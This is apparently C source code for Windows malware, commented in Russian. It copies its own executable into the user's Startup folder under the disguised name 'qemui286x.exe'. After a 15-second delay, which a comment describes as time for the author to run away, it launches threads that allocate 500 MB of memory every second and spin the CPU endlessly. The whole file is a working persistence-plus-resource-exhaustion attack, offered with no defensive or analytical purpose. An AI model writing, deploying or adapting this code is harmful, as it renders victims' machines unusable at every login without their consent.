#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <time.h>
#include <pthread.h>
#include <windows.h>
#include <unistd.h>
#include <stdint.h>
#include <shlobj.h>

unsigned __stdcall memleak(){
    volatile char* p;
    while(1){ p = malloc(1024 * 1024 * 500); Sleep(1000);}
}

unsigned __stdcall cpu100(){
    volatile register long rax __asm__("rax") = 0;
    while (1) {rax++;}
    
}




void autostart(const char* binary) {
    char fullpath[MAX_PATH];
    char startupPath[MAX_PATH];
    char destPath[MAX_PATH];


    GetModuleFileName(NULL, fullpath, MAX_PATH); // полный ебаный путь

    SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, startupPath); // копировка в авто загрузку
    snprintf(destPath, MAX_PATH, "%s\\%s", startupPath, binary); 
    CopyFile(fullpath, destPath, FALSE); // cp как на линуксе
}

int main(void){
    autostart("qemui286x.exe");
    sleep(0xf); // у меня есть 15 секунд что б запустить и убежать
    uintptr_t hThread1;
    uintptr_t hThread2;
    hThread1 = _beginthreadex( NULL, 0, memleak, NULL, 0, NULL );
    hThread2 = _beginthreadex( NULL, 0, cpu100, NULL, 0, NULL );
    

    int i = 0;
    while(1) i++;
}




